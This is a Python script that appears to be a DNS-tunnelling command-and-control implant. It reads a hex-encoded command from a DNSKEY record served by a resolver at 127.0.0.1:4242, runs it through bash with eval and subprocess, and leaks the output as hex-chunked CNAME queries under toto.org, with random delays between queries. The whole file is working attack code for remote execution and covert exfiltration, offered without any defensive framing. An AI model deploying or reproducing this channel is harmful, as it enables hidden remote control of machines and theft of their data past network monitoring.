#!/usr/bin/env python3
import dnslib
import time
import random
import subprocess

def deobfuscate_payload(payload):
 deobfuscated_payload = bytes.fromhex(payload).decode()
 return deobfuscated_payload

def execute_payload(payload, algorithm):
    executed_payload = ""

    dp = deobfuscate_payload(payload)

    if algorithm == 13:
        process = eval(f"subprocess.Popen('{dp}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')")
        executed_payload, _ = process.communicate()


    return executed_payload.decode()

if __name__ == '__main__':
    d = dnslib.DNSRecord.question('toto.org', 'DNSKEY')
    d = d.send('127.0.0.1', 4242)

    resp = dnslib.DNSRecord.parse(d)
    pld = str(resp.rr[0].rdata.key.decode())
    algorithm = resp.rr[0].rdata.algorithm

    executed_payload = execute_payload(pld, algorithm)

    pld_inhex = f"{executed_payload.encode().hex()}"
    octet_segments = [pld_inhex[i:i+60] for i in range(0, len(pld_inhex), 60)]
    nb_segment = len(octet_segments)-1
    for segment in octet_segments:
        print(f"{nb_segment}a{segment}.toto.org")
        d = dnslib.DNSRecord.question(f"{nb_segment}a{segment}.toto.org", 'CNAME')
        d = d.send('127.0.0.1', 4242)
        nb_segment-=1
        time.sleep(random.uniform(0.0, 1.0))




